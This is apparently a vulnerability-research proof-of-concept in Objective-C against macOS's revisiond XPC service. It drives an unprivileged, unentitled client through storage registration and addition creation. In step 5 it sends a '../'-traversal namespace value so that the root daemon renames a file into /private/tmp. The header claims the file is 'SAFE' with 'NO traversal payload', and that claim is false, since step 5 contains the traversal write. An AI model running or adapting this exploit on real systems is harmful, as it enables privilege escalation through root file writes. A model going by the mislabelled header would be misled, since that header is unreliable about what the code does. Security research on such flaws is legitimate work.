// revisiond GSProtocol NSXPC client — SAFE chain validation (steps 1-4).
// NO traversal payload. Stops before the '..'-escape write.
// Build: clang -fobjc-arc -framework Foundation -o revisiond_poc revisiond_poc.m
// Run as uid=501 (no entitlements).
//
// === Recovered interface (static RE of GSClient in revisiond,
//     GenerationalStorage.framework/Versions/A/Support/revisiond, arm64e) ===
// Reply/completion block signatures (from __objc_methtype extended types,
// cross-checked against each method's blraa [block+0x10] call):
//   permanentStorageIDForHandle:reply:
//        v16@?0Q8@"NSError"16   -> reply(unsigned long long storageID, NSError*)
//   permanentStoragePrefixForHandle:reply:
//        v24@?0@"NSString"8@"NSError"16 -> reply(NSString* prefix, NSError*)
//   stagingPrefixForDevice:(int)volumeUUID:(NSUUID*)reply:
//        v32@?0@"NSString"8@"NSData"16@"NSError"24 -> reply(NSString*, NSData*, NSError*)
//   permanentStorageOpenForHandle:withRemoteID:(unsigned long long)andDocumentID:(GSDocumentIdentifier*)reply:
//        v40@?0@"NSNumber"8@"NSData"16@"NSData"24@"NSError"32
//        -> reply(NSNumber* instanceID, NSData*, NSData*, NSError*)
//   createAdditionInStorage:(long long)stagedFileDescriptor:(NSFileHandle*)creationInfo:(NSDictionary*)completionHandler:
//        v40@?0@"NSDictionary"8@"NSData"16@"NSData"24@"NSError"32
//        -> completionHandler(NSDictionary* additionInfo, NSData*, NSData*, NSError*)
// creationInfo keys are the LITERAL strings "kGSAdditionName","kGSAdditionNameSpace",...
// GSDocumentIdentifier (client-side, in GenerationalStorage.framework) constructs a
// transportable doc identifier from an fd+URL; needed so open registers a storage
// instance (open with a nil docID echoes the storage id but does NOT register).
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <fcntl.h>
#import <unistd.h>

@interface GSDocumentIdentifier : NSObject <NSSecureCoding>
- (id)initWithFileDescriptor:(int)fd forItemAtURL:(NSURL*)url allocateIfNone:(BOOL)a error:(NSError**)e;
@end

// NOTE: do NOT name this protocol "GSProtocol" — the framework defines its own
// GSProtocol and ObjC uniques protocols by name, so a same-named partial decl
// corrupts the framework's interface setup. We declare the selectors here only for
// compile-time typed calls; the live NSXPCInterface is built from the framework's
// AUTHENTIC protocol object via objc_getProtocol("GSProtocol").
@protocol GSPocProtocol
- (void)permanentStorageIDForHandle:(NSFileHandle *)h
                              reply:(void (^)(unsigned long long storageID, NSError *err))reply;
- (void)stagingPrefixForDevice:(int)device
                    volumeUUID:(NSUUID *)uuid
                         reply:(void (^)(NSString *prefix, NSData *d, NSError *err))reply;
- (void)permanentStorageOpenForHandle:(NSFileHandle *)h
                         withRemoteID:(unsigned long long)rid
                        andDocumentID:(GSDocumentIdentifier *)did
                                reply:(void (^)(NSNumber *instanceID, NSData *a, NSData *b, NSError *err))reply;
- (void)createAdditionInStorage:(long long)storage
           stagedFileDescriptor:(NSFileHandle *)fd
                   creationInfo:(NSDictionary *)info
              completionHandler:(void (^)(NSDictionary *info, NSData *a, NSData *b, NSError *err))ch;
- (void)setAdditionNameSpaceInStorage:(long long)storage
                          nameSpace:(NSString *)ns
                       additionName:(NSString *)name
                              value:(NSString *)value
                  completionHandler:(void (^)(NSDictionary *info, NSError *err))ch;
- (oneway void)permanentStorageClose:(unsigned long long)close;
@end

static NSXPCConnection *gConn;
static dispatch_semaphore_t S;
static id<GSPocProtocol> remote(void) {
    return [gConn remoteObjectProxyWithErrorHandler:^(NSError *e){
        NSLog(@"[xpc-proxy-error] %@", e); dispatch_semaphore_signal(S);
    }];
}
static void wait6(void){ dispatch_semaphore_wait(S, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC)); }

int main(int argc, char **argv) { @autoreleasepool {
    NSLog(@"[*] uid=%d euid=%d", getuid(), geteuid());
    S = dispatch_semaphore_create(0);

    // Provision DocumentRevisions storage for an attacker-owned file the benign way:
    // add a version of our own file (normal user action). This gives the file storage.
    NSString *home = NSHomeDirectory();
    NSURL *docURL = [NSURL fileURLWithPath:[home stringByAppendingPathComponent:@".revisiond_poc_docfile"]];
    [@"v1\n" writeToURL:docURL atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSURL *srcURL = [NSURL fileURLWithPath:[home stringByAppendingPathComponent:@".revisiond_poc_src"]];
    [@"version-A\n" writeToURL:srcURL atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSError *ve=nil;
    [NSFileVersion addVersionOfItemAtURL:docURL withContentsOfURL:srcURL
                                 options:NSFileVersionAddingByMoving error:&ve];
    NSLog(@"[*] provisioned storage for %@ (err=%@)", docURL.path, ve);

    // GSDocumentIdentifier from the private client framework.
    void *fwk = dlopen("/System/Library/PrivateFrameworks/GenerationalStorage.framework/GenerationalStorage", RTLD_NOW);
    Class GSDI = objc_getClass("GSDocumentIdentifier");
    NSLog(@"[*] GenerationalStorage=%p GSDocumentIdentifier=%@", fwk, GSDI);
    int dfd = open(docURL.fileSystemRepresentation, O_RDONLY);
    NSError *ie=nil;
    GSDocumentIdentifier *ident = [[GSDI alloc] initWithFileDescriptor:dfd forItemAtURL:docURL allocateIfNone:YES error:&ie];
    NSLog(@"[*] documentIdentifier=%@ (err=%@)", ident, ie);

    NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:docURL.path];
    struct stat st; bzero(&st,sizeof(st)); stat(docURL.fileSystemRepresentation,&st);

    // ---- STEP 1: connect (accept gate is unconditional; confirmed open) ----
    gConn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.revisiond" options:0];
    // Build the interface from the framework's AUTHENTIC GSProtocol (full, correct
    // block signatures) rather than our partial typed-call decl, to avoid name collision.
    Protocol *realProto = objc_getProtocol("GSProtocol");
    NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:realProto];
    if (GSDI) [iface setClasses:[NSSet setWithObject:GSDI]
                    forSelector:@selector(permanentStorageOpenForHandle:withRemoteID:andDocumentID:reply:)
                  argumentIndex:2 ofReply:NO];
    [iface setClasses:[NSSet setWithArray:@[NSDictionary.class,NSArray.class,NSString.class,NSData.class,
                                            NSNumber.class,NSDate.class,NSUUID.class,NSError.class,NSURL.class]]
          forSelector:@selector(createAdditionInStorage:stagedFileDescriptor:creationInfo:completionHandler:)
        argumentIndex:0 ofReply:YES];
    [iface setClasses:[NSSet setWithArray:@[NSDictionary.class,NSArray.class,NSString.class,NSData.class,
                                            NSNumber.class,NSDate.class,NSError.class,NSURL.class]]
          forSelector:@selector(setAdditionNameSpaceInStorage:nameSpace:additionName:value:completionHandler:)
        argumentIndex:0 ofReply:YES];
    gConn.remoteObjectInterface = iface;
    __block BOOL invalidated = NO;
    gConn.invalidationHandler = ^{ invalidated = YES; NSLog(@"[!] connection INVALIDATED"); };
    gConn.interruptionHandler  = ^{ NSLog(@"[!] connection INTERRUPTED"); };
    [gConn resume];
    NSLog(@"[1] NSXPCConnection to com.apple.revisiond resumed as uid=501 (no entitlement)");

    // ---- STEP 2: permanentStorageIDForHandle -> storageID ----
    __block unsigned long long gSid = 0;
    [remote() permanentStorageIDForHandle:fh reply:^(unsigned long long sid, NSError *err){
        gSid = sid; NSLog(@"[2] permanentStorageIDForHandle -> storageID=%llu err=%@", sid, err);
        dispatch_semaphore_signal(S);
    }];
    wait6();

    // ---- STEP 3: stagingPrefixForDevice:volumeUUID: -> staging prefix ----
    NSURL *volURL = [NSURL fileURLWithPath:@"/System/Volumes/Data"];
    id vid=nil; [volURL getResourceValue:&vid forKey:NSURLVolumeUUIDStringKey error:nil];
    NSUUID *vuuid = [[NSUUID alloc] initWithUUIDString:vid];
    __block NSString *gPrefix = nil;
    [remote() stagingPrefixForDevice:(int)st.st_dev volumeUUID:vuuid reply:^(NSString *p, NSData *d, NSError *err){
        gPrefix = p; NSLog(@"[3] stagingPrefixForDevice -> prefix=%@ err=%@", p, err);
        dispatch_semaphore_signal(S);
    }];
    wait6();
    NSFileHandle *stagedFh = nil;
    if (gPrefix) {
        NSString *sp = [gPrefix stringByAppendingPathComponent:@"poc_staged"];
        [@"poc-staged-payload\n" writeToFile:sp atomically:NO encoding:NSUTF8StringEncoding error:nil];
        NSLog(@"[3b] wrote staged payload at %@", sp);
        stagedFh = [NSFileHandle fileHandleForReadingAtPath:sp];
    }

    // ---- STEP 3c: open storage to register an instance for this connection.
    // The per-client instance table (GSClient->_storageVolPaths) is keyed by
    // NSNumber(remoteID) — the CLIENT-chosen value — NOT by the returned storage id.
    // createAddition's `storage` argument is looked up against this remoteID key.
    unsigned long long R = ((unsigned long long)arc4random() << 1) | 0x1001; // fresh nonzero
    __block BOOL opened = NO;
    [remote() permanentStorageOpenForHandle:fh withRemoteID:R andDocumentID:ident
                                      reply:^(NSNumber *num, NSData *a, NSData *b, NSError *err){
        opened = (err == nil);
        NSLog(@"[3c] permanentStorageOpen(remoteID=%llu) -> generation#=%@ err=%@", R, num, err);
        dispatch_semaphore_signal(S);
    }];
    wait6();

    // ---- STEP 4: CONTROL createAddition with BENIGN name (NO traversal).
    // storage: = R (the remoteID we registered), name = benign in-store marker.
    if (opened && stagedFh) {
        NSDictionary *info = @{ @"kGSAdditionName":      @"f",
                                @"kGSAdditionNameSpace": @"n" };
        [remote() createAdditionInStorage:(long long)R stagedFileDescriptor:stagedFh creationInfo:info
                        completionHandler:^(NSDictionary *ai, NSData *a, NSData *b, NSError *err){
            NSLog(@"[4] createAddition(control, storage=remoteID=%llu) -> additionInfo=%@ err=%@", R, ai, err);
            if (ai[@"u"]) NSLog(@"[4>] addition LANDED (root revisiond) at: %@", ai[@"u"]);
            dispatch_semaphore_signal(S);
        }];
        wait6();

        // ---- STEP 5: SIBLING BYPASS — setAdditionNameSpaceInStorage has NO name validation
        // and uses plain renameat (no RENAME_NOFOLLOW_ANY). value:(=newNameSpace) is inserted
        // verbatim as a path component -> ../ traversal honored by root.
        NSString *TRAV = @"../../../../../../../../../../../../private/tmp/revproof_sibling_dawgyg";
        [remote() setAdditionNameSpaceInStorage:(long long)R nameSpace:@"n" additionName:@"f"
                                          value:TRAV
                              completionHandler:^(NSDictionary *info, NSError *err){
            NSLog(@"[5] setAdditionNameSpace(value=TRAVERSAL) -> info=%@ err=%@", info, err);
            dispatch_semaphore_signal(S);
        }];
        wait6();
        [remote() permanentStorageClose:R];
    } else {
        NSLog(@"[4] SKIPPED control createAddition (opened=%d stagedFh=%@)", opened, stagedFh);
    }

    NSLog(@"[*] done. invalidated=%d", invalidated);
    [[NSFileManager defaultManager] removeItemAtPath:docURL.path error:nil];
    return 0;
}}
